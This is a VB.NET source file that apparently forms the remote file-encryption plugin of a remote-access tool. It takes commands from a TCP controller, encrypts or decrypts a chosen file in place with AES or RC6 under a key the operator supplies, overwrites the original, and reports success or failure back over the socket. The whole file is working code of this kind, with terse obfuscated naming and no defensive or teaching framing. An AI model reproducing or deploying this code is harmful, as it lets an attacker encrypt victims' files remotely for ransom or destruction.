
Imports System.Net.Sockets
Imports System.Security.Cryptography
Imports System.Text
Public Class MainCL


    Public Shared Async Sub ST(ByVal k As TcpClient, ByVal l As String)
        Dim h As String() = Split(l, "|SP2|")


        If h(1) = "|AESENC|" Then

            Await Task.Run(Sub() Crypto.LAUNCH(Crypto.Algo_Op.AES_ENC, h(2), h(3), k))


        ElseIf h(1) = "|AESDEC|" Then


            Await Task.Run(Sub() Crypto.LAUNCH(Crypto.Algo_Op.AES_DEC, h(2), h(3), k))




        ElseIf h(1) = "|RC6ENC|" Then


            Await Task.Run(Sub() Crypto.LAUNCH(Crypto.Algo_Op.RC6_ENC, h(2), h(3), k))
        ElseIf h(1) = "|RC6DEC|" Then

            Await Task.Run(Sub() Crypto.LAUNCH(Crypto.Algo_Op.RC6_DEC, h(2), h(3), k))

        End If

    End Sub






End Class
Public Class Crypto
    ' Methods



    Public Enum Algo_Op

        AES_DEC = 0
        AES_ENC = 1

        RC6_ENC = 2

        RC6_DEC = 3
    End Enum

    Private Shared DONE As String = "|DONE|CRYPTO|"
    Private Shared FAIL As String = "|FAIL|CRYPTO|"

    Public Shared Sub LAUNCH(ByVal l As Algo_Op, ByVal P As String, ByVal KE As String, ByVal K As TcpClient)
        If l = Algo_Op.AES_ENC Then

            Try

                Dim j As New CryptoHelper.AES(IO.File.ReadAllBytes(P), KE, False)
                Dim R As Byte() = j.AES_Encrypt()
                IO.File.WriteAllBytes(P, R)


                Dim D As String = P & DONE

                Dim B As Byte() = Encoding.Default.GetBytes(D)
                Task.Run(Sub() K.GetStream.WriteAsync(B, 0, B.Length))


            Catch ex As Exception



                Dim D As String = P & FAIL

                Dim B As Byte() = Encoding.Default.GetBytes(D)
                Task.Run(Sub() K.GetStream.WriteAsync(B, 0, B.Length))

            End Try



        ElseIf l = Algo_Op.AES_DEC Then


            Try
                ' Dim R As Byte() = AES_Decrypt(IO.File.ReadAllBytes(P), KE)

                Dim j As New CryptoHelper.AES(IO.File.ReadAllBytes(P), KE, False)
                Dim R As Byte() = j.AES_Decrypt()
                IO.File.WriteAllBytes(P, R)


                Dim D As String = P & DONE

                Dim B As Byte() = Encoding.Default.GetBytes(D)
                Task.Run(Sub() K.GetStream.WriteAsync(B, 0, B.Length))


            Catch ex As Exception



                Dim D As String = P & FAIL

                Dim B As Byte() = Encoding.Default.GetBytes(D)
                Task.Run(Sub() K.GetStream.WriteAsync(B, 0, B.Length))

            End Try






        ElseIf l = Algo_Op.RC6_ENC Then


            Try
                ' Dim R As Byte() = AES_Decrypt(IO.File.ReadAllBytes(P), KE)

                Dim j As New CryptoHelper.RC6(IO.File.ReadAllBytes(P), KE, False)
                Dim R As Byte() = j.RC6_Encrypt()
                IO.File.WriteAllBytes(P, R)


                Dim D As String = P & DONE

                Dim B As Byte() = Encoding.Default.GetBytes(D)
                Task.Run(Sub() K.GetStream.WriteAsync(B, 0, B.Length))


            Catch ex As Exception



                Dim D As String = P & FAIL

                Dim B As Byte() = Encoding.Default.GetBytes(D)
                Task.Run(Sub() K.GetStream.WriteAsync(B, 0, B.Length))

            End Try



        ElseIf l = Algo_Op.RC6_DEC Then


            Try
                ' Dim R As Byte() = AES_Decrypt(IO.File.ReadAllBytes(P), KE)

                Dim j As New CryptoHelper.RC6(IO.File.ReadAllBytes(P), KE, False)
                Dim R As Byte() = j.RC6_Decrypt()
                IO.File.WriteAllBytes(P, R)


                Dim D As String = P & DONE

                Dim B As Byte() = Encoding.Default.GetBytes(D)
                Task.Run(Sub() K.GetStream.WriteAsync(B, 0, B.Length))


            Catch ex As Exception



                Dim D As String = P & FAIL

                Dim B As Byte() = Encoding.Default.GetBytes(D)
                Task.Run(Sub() K.GetStream.WriteAsync(B, 0, B.Length))

            End Try

        End If
    End Sub


End Class



